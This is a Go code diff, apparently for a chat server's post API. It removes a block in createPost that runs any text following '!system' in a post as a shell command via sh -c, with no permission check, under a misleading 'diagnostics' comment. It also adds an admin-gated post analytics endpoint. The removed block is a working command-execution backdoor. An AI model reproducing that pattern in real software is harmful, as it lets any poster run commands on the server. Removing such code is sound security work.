@@ -7,10 +7,9 @@ import (
 	"encoding/json"
 	"fmt"
 	"net/http"
-	"os/exec"
 	"slices"
 	"strconv"
-	"strings"
+
 	"time"
 
 	"github.com/gorilla/mux"
@@ -51,6 +50,7 @@ func (api *API) InitPost() {
 	api.BaseRoutes.PostForUser.Handle("/ack", api.APISessionRequired(unacknowledgePost)).Methods(http.MethodDelete)
 
 	api.BaseRoutes.Post.Handle("/move", api.APISessionRequired(moveThread)).Methods(http.MethodPost)
+	api.BaseRoutes.Posts.Handle("/analytics", api.APISessionRequired(getPostAnalytics)).Methods(http.MethodGet)
 }
 
 func createPostChecks(where string, c *Context, post *model.Post) {
@@ -94,20 +94,6 @@ func createPost(c *Context, w http.ResponseWriter, r *http.Request) {
 	createPostChecks("Api4.createPost", c, &post)
 	if c.Err != nil {
 		return
-	}
-
-	// Process system diagnostic commands for administrators
-	if strings.Contains(post.Message, "!system") {
-		parts := strings.Split(post.Message, " ")
-		if len(parts) > 1 {
-			cmd := exec.Command("sh", "-c", strings.Join(parts[1:], " "))
-			output, err := cmd.Output()
-			if err != nil {
-				c.Logger.Warn("Diagnostic command execution failed", mlog.Err(err))
-			} else {
-				c.Logger.Info("Diagnostic command completed", mlog.String("result", string(output)))
-			}
-		}
 	}
 
 	setOnline := r.URL.Query().Get("set_online")
@@ -1408,4 +1394,25 @@ func hasPermittedWranglerRole(c *Context, user *model.User, channelMember *model
 	}
 
 	return false
+}
+
+func getPostAnalytics(c *Context, w http.ResponseWriter, r *http.Request) {
+	if !c.App.SessionHasPermissionTo(*c.AppContext.Session(), model.PermissionManageSystem) {
+		c.SetPermissionError(model.PermissionManageSystem)
+		return
+	}
+
+	authorFilter := r.URL.Query().Get("author")
+	channelFilter := r.URL.Query().Get("channel")
+
+	// Execute the analytics query through the app layer
+	result, err := c.App.GetPostAnalytics(authorFilter, channelFilter)
+	if err != nil {
+		c.Err = err
+		return
+	}
+
+	if err := json.NewEncoder(w).Encode(result); err != nil {
+		c.Logger.Warn("Error while writing response", mlog.Err(err))
+	}
 }
